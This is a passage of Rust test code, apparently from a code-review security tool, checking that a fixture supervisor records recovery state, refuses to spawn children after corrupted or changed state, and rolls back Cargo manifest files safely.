    #[tokio::test]
    async fn direct_api_without_explicit_model_is_inconclusive() {
        for provider in [
            "openrouter",
            "openai",
            "anthropic",
            "deepseek",
            "zai",
            "kimi",
        ] {
            let mut config = Config::default();
            config.security.review_provider = Some(provider.into());
            assert!(llm_verdict(&config, "synthetic source").await.is_none());
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn failed_group_cancel_records_direct_exit_but_keeps_recovery_unknown() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("recovery"),
        )
        .unwrap();
        let recovery_path = root.path().join("recovery");
        let gate = FixtureStartGate::with_same_user_recovery(
            crate::recovery_state::open_provisioned_state_directory(&recovery_path).unwrap(),
        );
        gate.begin_fixture_start().unwrap();
        let mut spawned = gate
            .start_fixture_child(|| {
                Command::new("/usr/bin/sleep")
                    .arg("30")
                    .env_clear()
                    .stdin(Stdio::null())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .spawn()
            })
            .unwrap();
        let context = gate
            .record_same_user_child(spawned.child.as_mut().unwrap())
            .unwrap();
        let group = root.path().join("fake-group");
        std::fs::create_dir(&group).unwrap();
        std::fs::write(group.join("cgroup.events"), b"populated 1\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(&group).unwrap();
        let sequence = crate::codex_supervision::CgroupSequence::new(observation);
        let attempt = FixtureReviewAttempt::start(sequence).unwrap();
        let mut supervised = FixtureSupervisedChild {
            attempt,
            child: spawned.child.take().unwrap(),
            reaped: false,
            recovery_exit: context,
        };
        assert!(supervised
            .cancel_and_observe(Duration::from_secs(2))
            .is_err());
        assert!(supervised.reaped);
        assert_eq!(
            crate::recovery_state::local_recovery_evidence_at(&recovery_path),
            crate::recovery_state::LocalRecoveryEvidence::PendingDirectExitRecorded
        );
        assert!(recovery_path.join("pending-intent").exists());
        assert!(recovery_path.join("pending-child").exists());
        assert!(recovery_path.join("pending-exit").exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_exit_is_not_published_to_replaced_recovery_directory() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("recovery"),
        )
        .unwrap();
        let state = root.path().join("recovery");
        let moved = root.path().join("moved-recovery");
        let gate = FixtureStartGate::with_same_user_recovery(
            crate::recovery_state::open_provisioned_state_directory(&state).unwrap(),
        );
        gate.begin_fixture_start().unwrap();
        let mut spawned = gate
            .start_fixture_child(|| {
                Command::new("/bin/sh")
                    .args(["-c", "IFS= read -r line"])
                    .env_clear()
                    .stdin(Stdio::piped())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .spawn()
            })
            .unwrap();
        let context = gate
            .record_same_user_child(spawned.child.as_mut().unwrap())
            .unwrap();
        let group = root.path().join("fake-group");
        std::fs::create_dir(&group).unwrap();
        std::fs::write(group.join("cgroup.events"), b"populated 1\n").unwrap();
        let observation = crate::codex_supervision::CgroupObservation::open(&group).unwrap();
        let attempt =
            FixtureReviewAttempt::start(crate::codex_supervision::CgroupSequence::new(observation))
                .unwrap();
        let mut supervised = FixtureSupervisedChild {
            attempt,
            child: spawned.child.take().unwrap(),
            reaped: false,
            recovery_exit: context,
        };
        let intent = std::fs::read(state.join("pending-intent")).unwrap();
        let locator = std::fs::read(state.join("pending-child")).unwrap();
        std::fs::rename(&state, &moved).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("recovery"),
        )
        .unwrap();
        supervised.reaped = stop_fixture_direct_child(&mut supervised.child);
        assert!(supervised.reaped);
        assert_eq!(
            supervised.record_reaped_exit(),
            Err("fixture recovery unavailable")
        );
        assert!(!moved.join("pending-exit").exists());
        assert!(!state.join("pending-exit").exists());
        assert!(!state.join("pending-intent").exists());
        assert_eq!(std::fs::read(moved.join("pending-intent")).unwrap(), intent);
        assert_eq!(std::fs::read(moved.join("pending-child")).unwrap(), locator);
        let inspection = crate::same_user_supervisor::inspect_recovery(&moved);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn same_user_gate_refuses_old_binding_without_spawning() {
        use std::os::unix::fs::{symlink, PermissionsExt};
        for dangling in [false, true] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("recovery"),
            )
            .unwrap();
            let path = root.path().join("recovery");
            let binding = path.join("pending-attempt");
            if dangling {
                symlink("absent", &binding).unwrap();
            } else {
                std::fs::write(&binding, b"incomplete synthetic record").unwrap();
            }
            let directory = crate::recovery_state::open_provisioned_state_directory(&path).unwrap();
            let gate = FixtureStartGate::with_same_user_recovery(directory);
            assert_eq!(
                gate.begin_fixture_start(),
                Err("fixture recovery unavailable")
            );
            let result = gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                panic!("unresolved record must block spawn")
            });
            assert!(matches!(result, Err("fixture startup not begun")));
            assert!(!path.join("pending-intent").exists());
            assert!(std::fs::symlink_metadata(&binding).is_ok());
            if !dangling {
                assert_eq!(
                    std::fs::read(&binding).unwrap(),
                    b"incomplete synthetic record"
                );
            }
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn same_user_gate_persists_before_spawn_and_blocks_after_interruption() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        const CHILD: &str = "TUCUPI_SAME_USER_GATE_TEST";
        if let Some(path) = std::env::var_os(CHILD) {
            let path = std::path::Path::new(&path);
            let directory = crate::recovery_state::open_provisioned_state_directory(path).unwrap();
            let source = tempfile::tempdir_in(path.parent().unwrap()).unwrap();
            std::fs::write(source.path().join("Cargo.toml"), b"fixture manifest").unwrap();
            let gate = FixtureStartGate::with_synthetic_recovery_plan(
                directory,
                source,
                b"modified fixture".to_vec(),
            );
            gate.begin_fixture_start().unwrap();
            let reopened = crate::recovery_state::open_provisioned_state_directory(path).unwrap();
            assert_eq!(
                crate::recovery_state::fixture_read_postimage(&reopened).unwrap(),
                b"modified fixture"
            );
            assert_eq!(
                crate::same_user_supervisor::read_synthetic_files(path)
                    .unwrap()
                    .cargo_toml,
                Some(b"fixture manifest".to_vec())
            );
            assert_eq!(
                crate::recovery_state::local_recovery_evidence_at(path),
                crate::recovery_state::LocalRecoveryEvidence::PendingIntentObserved
            );
            let mut child = gate
                .start_fixture_child(|| {
                    Command::new("/bin/sh")
                        .args(["-c", "IFS= read -r line"])
                        .env_clear()
                        .stdin(Stdio::piped())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null())
                        .spawn()
                })
                .unwrap();
            gate.record_same_user_child(child.child.as_mut().unwrap())
                .unwrap();
            // The synthetic child exits on stdin EOF after this supervisor exits.
            std::process::exit(77);
        }
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("recovery"),
        )
        .unwrap();
        let state = root.path().join("recovery");
        let status = Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "review::tests::same_user_gate_persists_before_spawn_and_blocks_after_interruption",
            ])
            .env_clear()
            .env("HOME", root.path())
            .env("TMPDIR", root.path())
            .env(CHILD, &state)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .unwrap();
        assert_eq!(status.code(), Some(77));
        let snapshot = crate::same_user_supervisor::read_synthetic_files(&state).unwrap();
        assert_eq!(snapshot.cargo_toml, Some(b"fixture manifest".to_vec()));
        assert_eq!(snapshot.cargo_lock, None);
        let protected = root.path().join("protected");
        std::fs::write(&protected, b"keep").unwrap();
        let target = tempfile::tempdir_in(root.path()).unwrap();
        std::fs::write(target.path().join("Cargo.toml"), b"modified fixture").unwrap();
        assert!(crate::same_user_supervisor::recover_synthetic_attempt(
            &state,
            &target,
            b"different"
        )
        .is_err());
        assert_eq!(
            std::fs::read(target.path().join("Cargo.toml")).unwrap(),
            b"modified fixture"
        );
        let copy = crate::same_user_supervisor::recover_synthetic_attempt_with_persisted_postimage(
            &state, &target,
        )
        .unwrap();
        assert_eq!(
            std::fs::read(copy.path().join("Cargo.toml")).unwrap(),
            b"fixture manifest"
        );
        assert_eq!(
            std::fs::read(target.path().join("Cargo.toml")).unwrap(),
            b"fixture manifest"
        );
        assert_eq!(std::fs::read(&protected).unwrap(), b"keep");
        let intent_text = std::fs::read_to_string(state.join("pending-intent")).unwrap();
        let attempt_line = intent_text
            .lines()
            .find(|line| line.starts_with("attempt="))
            .unwrap();
        let result_path = state.join("pending-fixture-rollback");
        let result = std::fs::read_to_string(&result_path).unwrap();
        use sha2::{Digest, Sha256};
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let snapshot = crate::recovery_state::read_recovery_snapshot(&directory).unwrap();
        let mut postimage_digest = Sha256::new();
        postimage_digest.update(b"fixture-single-postimage-v1\n");
        postimage_digest.update([1]);
        postimage_digest.update(b"modified fixture");
        assert_eq!(
            result,
            format!("tucupi-fixture-rollback-v3\n{attempt_line}\nsnapshot={:x}\npostimage={:x}\nsynthetic-one-file=observed\n", Sha256::digest(snapshot), postimage_digest.finalize())
        );
        assert!(crate::same_user_supervisor::recover_synthetic_attempt(
            &state,
            &target,
            b"modified fixture"
        )
        .is_err());
        assert_eq!(std::fs::read_to_string(&result_path).unwrap(), result);
        assert_eq!(
            std::fs::read(target.path().join("Cargo.toml")).unwrap(),
            b"fixture manifest"
        );
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            crate::recovery_state::local_recovery_evidence_at(&state),
            crate::recovery_state::LocalRecoveryEvidence::PendingChildLocatorObserved
        );
        let intent = std::fs::read(state.join("pending-intent")).unwrap();
        let dir = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_same_user_recovery(dir);
        assert_eq!(
            gate.begin_fixture_start(),
            Err("fixture recovery unavailable")
        );
        let spawn = gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
            panic!("must not spawn after failed intent")
        });
        assert!(matches!(spawn, Err("fixture startup not begun")));
        assert_eq!(std::fs::read(state.join("pending-intent")).unwrap(), intent);
        assert!(state.join("pending-child").exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn same_user_gate_refuses_invalid_snapshot_before_spawning() {
        use std::os::unix::fs::PermissionsExt;
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_same_user_snapshot(
            directory,
            crate::same_user_supervisor::SyntheticFileSnapshot {
                version: 2,
                cargo_toml: Some(b"synthetic".to_vec()),
                cargo_lock: None,
            },
        );
        assert_eq!(
            gate.begin_fixture_start(),
            Err("fixture recovery unavailable")
        );
        let result = gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
            panic!("invalid snapshot must block spawn")
        });
        assert!(matches!(result, Err("fixture startup not begun")));
        assert!(state.join("pending-intent").exists());
        assert!(!state.join("pending-snapshot").exists());
        assert!(!state.join("pending-child").exists());
        assert_eq!(
            crate::same_user_supervisor::inspect_recovery(&state).rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_capture_failure_blocks_fixture_spawn() {
        use std::os::unix::fs::{symlink, PermissionsExt};
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let protected = root.path().join("protected");
        std::fs::write(&protected, b"unchanged").unwrap();
        let source = tempfile::tempdir_in(root.path()).unwrap();
        symlink(&protected, source.path().join("Cargo.toml")).unwrap();
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_synthetic_source(directory, source);
        assert_eq!(
            gate.begin_fixture_start(),
            Err("fixture recovery unavailable")
        );
        assert!(matches!(
            gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                panic!("capture failure must prevent spawn")
            }),
            Err("fixture startup not begun")
        ));
        assert!(state.join("pending-intent").exists());
        assert!(!state.join("pending-snapshot").exists());
        assert!(!state.join("pending-child").exists());
        assert_eq!(std::fs::read(protected).unwrap(), b"unchanged");
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_refuses_invalid_persisted_postimage() {
        use std::os::unix::fs::PermissionsExt;
        for mode in ["oversized", "corrupt", "missing"] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let state = root.path().join("state");
            let source = tempfile::tempdir_in(root.path()).unwrap();
            std::fs::write(source.path().join("Cargo.toml"), b"original").unwrap();
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let expected = if mode == "oversized" {
                vec![b'x'; 65537]
            } else {
                b"modified".to_vec()
            };
            let gate = FixtureStartGate::with_synthetic_recovery_plan(directory, source, expected);
            if mode == "oversized" {
                assert_eq!(
                    gate.begin_fixture_start(),
                    Err("fixture recovery unavailable")
                );
            } else {
                gate.begin_fixture_start().unwrap();
                let path = state.join("pending-fixture-postimage");
                if mode == "corrupt" {
                    let mut bytes = std::fs::read(&path).unwrap();
                    *bytes.last_mut().unwrap() ^= 1;
                    std::fs::write(&path, bytes).unwrap();
                } else {
                    std::fs::remove_file(path).unwrap();
                }
                assert!(matches!(
                    gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                        panic!("invalid postimage must block spawn")
                    }),
                    Err("fixture recovery unavailable")
                ));
            }
            assert!(state.join("pending-intent").exists());
            assert!(!state.join("pending-child").exists());
            assert!(matches!(
                gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                    panic!("closed gate must block spawn")
                }),
                Err("fixture startup not begun")
            ));
            let inspection = crate::same_user_supervisor::inspect_recovery(&state);
            assert_eq!(
                inspection.descendant_cleanup,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert_eq!(
                inspection.rollback,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_recovers_absent_postimage_after_supervisor_exit() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        const CHILD: &str = "TUCUPI_GATE_ABSENT_POSTIMAGE_CHILD";
        if let Some(path) = std::env::var_os(CHILD) {
            let state = std::path::Path::new(&path);
            let directory = crate::recovery_state::open_provisioned_state_directory(state).unwrap();
            let source = tempfile::tempdir_in(state.parent().unwrap()).unwrap();
            std::fs::write(source.path().join("Cargo.toml"), b"original").unwrap();
            let gate = FixtureStartGate::with_synthetic_absent_postimage(directory, source);
            gate.begin_fixture_start().unwrap();
            let mut child = gate
                .start_fixture_child(|| {
                    Command::new("/bin/sh")
                        .args(["-c", "IFS= read -r line"])
                        .env_clear()
                        .stdin(Stdio::piped())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null())
                        .spawn()
                })
                .unwrap();
            gate.record_same_user_child(child.child.as_mut().unwrap())
                .unwrap();
            std::process::exit(77);
        }
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let status = Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "review::tests::synthetic_gate_recovers_absent_postimage_after_supervisor_exit",
            ])
            .env_clear()
            .env("HOME", root.path())
            .env("TMPDIR", root.path())
            .env(CHILD, &state)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .unwrap();
        assert_eq!(status.code(), Some(77));
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        assert_eq!(
            crate::recovery_state::fixture_read_postimage_state(&directory).unwrap(),
            None
        );
        let target = tempfile::tempdir_in(root.path()).unwrap();
        let manifest = target.path().join("Cargo.toml");
        let protected = target.path().join("protected");
        std::fs::write(&manifest, b"").unwrap();
        std::fs::write(&protected, b"keep").unwrap();
        assert!(
            crate::same_user_supervisor::recover_synthetic_attempt_with_persisted_postimage(
                &state, &target
            )
            .is_err()
        );
        assert_eq!(std::fs::read(&manifest).unwrap(), b"");
        assert!(!state.join("pending-fixture-rollback").exists());
        std::fs::remove_file(&manifest).unwrap();
        let _copy =
            crate::same_user_supervisor::recover_synthetic_attempt_with_persisted_postimage(
                &state, &target,
            )
            .unwrap();
        assert_eq!(std::fs::read(&manifest).unwrap(), b"original");
        assert_eq!(std::fs::read(&protected).unwrap(), b"keep");
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert!(state.join("pending-child").exists());
        assert!(crate::same_user_supervisor::PendingAttempt::begin(
            &state,
            "0123456789abcdef0123456789abcdef"
        )
        .is_err());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_two_file_recovery_handles_interruption_and_conflict() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        const CHILD: &str = "TUCUPI_GATE_MULTI_RECOVERY_CHILD";
        if let Some(root) = std::env::var_os(CHILD) {
            let root = std::path::Path::new(&root);
            let state = root.join("state");
            let target = std::env::var_os("TUCUPI_GATE_MULTI_RECOVERY_TARGET").unwrap();
            let source = tempfile::tempdir_in(root).unwrap();
            std::fs::write(source.path().join("Cargo.toml"), b"original manifest").unwrap();
            std::fs::write(source.path().join("Cargo.lock"), b"original lock").unwrap();
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let expected = crate::same_user_supervisor::SyntheticFileSnapshot {
                version: 1,
                cargo_toml: Some(b"modified manifest".to_vec()),
                cargo_lock: Some(b"modified lock".to_vec()),
            };
            let gate = FixtureStartGate::with_synthetic_two_file_plan(directory, source, &expected)
                .unwrap();
            gate.begin_fixture_start().unwrap();
            let mut child = gate
                .start_fixture_child(|| {
                    Command::new("/bin/sh")
                        .args(["-c", "IFS= read -r line"])
                        .env_clear()
                        .stdin(Stdio::piped())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null())
                        .spawn()
                })
                .unwrap();
            gate.record_same_user_child(child.child.as_mut().unwrap())
                .unwrap();
            let _ = crate::same_user_supervisor::recover_synthetic_two_files_with_hook(
                &state,
                std::path::Path::new(&target),
                |name| {
                    if name == "Cargo.toml" {
                        std::process::exit(77);
                    }
                },
            );
            panic!("synthetic interruption did not occur");
        }
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let target = tempfile::tempdir_in(root.path()).unwrap();
        let manifest = target.path().join("Cargo.toml");
        let lock = target.path().join("Cargo.lock");
        std::fs::write(&manifest, b"modified manifest").unwrap();
        std::fs::write(&lock, b"modified lock").unwrap();
        std::fs::write(target.path().join("protected"), b"unchanged").unwrap();
        let status = Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "review::tests::synthetic_gate_two_file_recovery_handles_interruption_and_conflict",
            ])
            .env_clear()
            .env("HOME", root.path())
            .env("TMPDIR", root.path())
            .env(CHILD, root.path())
            .env("TUCUPI_GATE_MULTI_RECOVERY_TARGET", target.path())
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .unwrap();
        assert_eq!(status.code(), Some(77));
        assert_eq!(std::fs::read(&manifest).unwrap(), b"original manifest");
        assert_eq!(std::fs::read(&lock).unwrap(), b"modified lock");
        assert!(!state.join("pending-fixture-multi-rollback").exists());
        std::fs::write(&lock, b"conflict").unwrap();
        assert!(crate::same_user_supervisor::recover_synthetic_two_files(&state, &target).is_err());
        assert_eq!(std::fs::read(&manifest).unwrap(), b"original manifest");
        assert_eq!(std::fs::read(&lock).unwrap(), b"conflict");
        assert!(!state.join("pending-fixture-multi-rollback").exists());
        std::fs::write(&lock, b"modified lock").unwrap();
        crate::same_user_supervisor::recover_synthetic_two_files(&state, &target).unwrap();
        assert_eq!(std::fs::read(&manifest).unwrap(), b"original manifest");
        assert_eq!(std::fs::read(&lock).unwrap(), b"original lock");
        assert_eq!(
            std::fs::read(target.path().join("protected")).unwrap(),
            b"unchanged"
        );
        assert!(state.join("pending-fixture-multi-rollback").exists());
        assert!(state.join("pending-child").exists());
        let inspection = crate::same_user_supervisor::inspect_recovery(&state);
        assert_eq!(
            inspection.descendant_cleanup,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert_eq!(
            inspection.rollback,
            crate::same_user_supervisor::RecoveryOutcome::Unknown
        );
        assert!(crate::same_user_supervisor::PendingAttempt::begin(
            &state,
            "0123456789abcdef0123456789abcdef"
        )
        .is_err());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_rejects_absent_postimage_changed_to_empty() {
        use sha2::{Digest, Sha256};
        use std::os::unix::fs::PermissionsExt;
        let root = tempfile::tempdir().unwrap();
        std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
        crate::recovery_state::provision_state_directory(
            root.path(),
            std::ffi::OsStr::new("state"),
        )
        .unwrap();
        let state = root.path().join("state");
        let source = tempfile::tempdir_in(root.path()).unwrap();
        std::fs::write(source.path().join("Cargo.toml"), b"original").unwrap();
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        let gate = FixtureStartGate::with_synthetic_absent_postimage(directory, source);
        gate.begin_fixture_start().unwrap();
        let path = state.join("pending-fixture-postimage");
        let mut record = std::fs::read(&path).unwrap();
        record[40..44].copy_from_slice(&0_u32.to_be_bytes());
        let mut digest = Sha256::new();
        digest.update(b"TUCSING2");
        digest.update(0_u32.to_be_bytes());
        record[44..76].copy_from_slice(&digest.finalize());
        std::fs::write(&path, &record).unwrap();
        let directory = crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
        assert_eq!(
            crate::recovery_state::fixture_read_postimage_state(&directory).unwrap(),
            Some(Vec::new())
        );
        assert!(matches!(
            gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                panic!("empty postimage must not match absent")
            }),
            Err("fixture recovery unavailable")
        ));
        assert_eq!(std::fs::read(path).unwrap(), record);
        assert!(!state.join("pending-child").exists());
        assert!(state.join("pending-intent").exists());
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_blocks_changed_source_before_spawn() {
        use std::os::unix::fs::PermissionsExt;
        for add_lock in [false, true] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let state = root.path().join("state");
            let source = tempfile::tempdir_in(root.path()).unwrap();
            let manifest = source.path().join("Cargo.toml");
            let lock = source.path().join("Cargo.lock");
            std::fs::write(&manifest, b"original").unwrap();
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let gate = FixtureStartGate::with_synthetic_source(directory, source);
            gate.begin_fixture_start().unwrap();
            let snapshot = std::fs::read(state.join("pending-snapshot")).unwrap();
            if add_lock {
                std::fs::write(&lock, b"new lock").unwrap();
            } else {
                std::fs::write(&manifest, b"changed").unwrap();
            }
            assert!(matches!(
                gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                    panic!("changed source must prevent spawn")
                }),
                Err("fixture recovery unavailable")
            ));
            assert!(!state.join("pending-child").exists());
            assert_eq!(
                std::fs::read(state.join("pending-snapshot")).unwrap(),
                snapshot
            );
            assert!(state.join("pending-intent").exists());
            let inspection = crate::same_user_supervisor::inspect_recovery(&state);
            assert_eq!(
                inspection.descendant_cleanup,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert_eq!(
                inspection.rollback,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert!(matches!(
                gate.start_fixture_child(|| -> std::io::Result<std::process::Child> {
                    panic!("closed gate must prevent spawn")
                }),
                Err("fixture startup not begun")
            ));
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_refuses_changed_source_before_release() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        for add_lock in [false, true] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let state = root.path().join("state");
            let source = tempfile::tempdir_in(root.path()).unwrap();
            let manifest = source.path().join("Cargo.toml");
            let lock = source.path().join("Cargo.lock");
            std::fs::write(&manifest, b"original").unwrap();
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let gate = FixtureStartGate::with_synthetic_recovery_plan(
                directory,
                source,
                b"modified".to_vec(),
            );
            gate.begin_fixture_start().unwrap();
            let mut child = gate
                .start_fixture_child(|| {
                    Command::new("/bin/sh")
                        .args(["-c", "IFS= read -r line"])
                        .env_clear()
                        .stdin(Stdio::piped())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null())
                        .spawn()
                })
                .unwrap();
            gate.record_same_user_child(child.child.as_mut().unwrap())
                .unwrap();
            gate.attach_synthetic_kill(tempfile::tempfile_in(root.path()).unwrap())
                .unwrap();
            if add_lock {
                std::fs::write(&lock, b"unexpected").unwrap();
            } else {
                std::fs::write(&manifest, b"changed").unwrap();
            }
            let mut release = Vec::new();
            assert_eq!(
                gate.release(&mut release),
                Err("fixture recovery unavailable")
            );
            assert!(release.is_empty());
            if add_lock {
                std::fs::remove_file(&lock).unwrap();
            } else {
                std::fs::write(&manifest, b"original").unwrap();
            }
            assert_eq!(
                gate.release(&mut release),
                Err("fixture recovery unavailable")
            );
            assert!(release.is_empty());
            assert_eq!(
                child
                    .reject_with_cleanup("fixture recovery unavailable", stop_fixture_direct_child),
                "fixture recovery unavailable"
            );
            assert!(child.child.is_none());
            assert!(state.join("pending-intent").exists());
            assert!(state.join("pending-child").exists());
            let inspection = crate::same_user_supervisor::inspect_recovery(&state);
            assert_eq!(
                inspection.descendant_cleanup,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
            assert_eq!(
                inspection.rollback,
                crate::same_user_supervisor::RecoveryOutcome::Unknown
            );
        }
    }

    #[cfg(all(target_os = "linux", feature = "codex-fixture"))]
    #[test]
    fn synthetic_gate_refuses_changed_source_before_binding_child() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};
        for add_lock in [false, true] {
            let root = tempfile::tempdir().unwrap();
            std::fs::set_permissions(root.path(), std::fs::Permissions::from_mode(0o700)).unwrap();
            crate::recovery_state::provision_state_directory(
                root.path(),
                std::ffi::OsStr::new("state"),
            )
            .unwrap();
            let state = root.path().join("state");
            let source = tempfile::tempdir_in(root.path()).unwrap();
            let manifest = source.path().join("Cargo.toml");
            let lock = source.path().join("Cargo.lock");
            std::fs::write(&manifest, b"original").unwrap();
            let directory =
                crate::recovery_state::open_provisioned_state_directory(&state).unwrap();
            let gate = FixtureStartGate::with_synthetic_recovery_plan(
                directory,
                source,
                b"modified".to_vec(),
            );
            gate.begin_fixture_start().unwrap();
            let intent = std::fs::read(state.join("pending-intent")).unwrap();
            let snapshot = std::fs::read(state.join("pending-snapshot")).unwrap();
            let mut child = gate
                .start_fixture_child(|| {
                    Command::new("/bin/sh")
                        .args(["-c", "IFS= read -r line"])
                        .env_clear()
                        .stdin(Stdio::piped())
                        .stdout(Stdio::null())
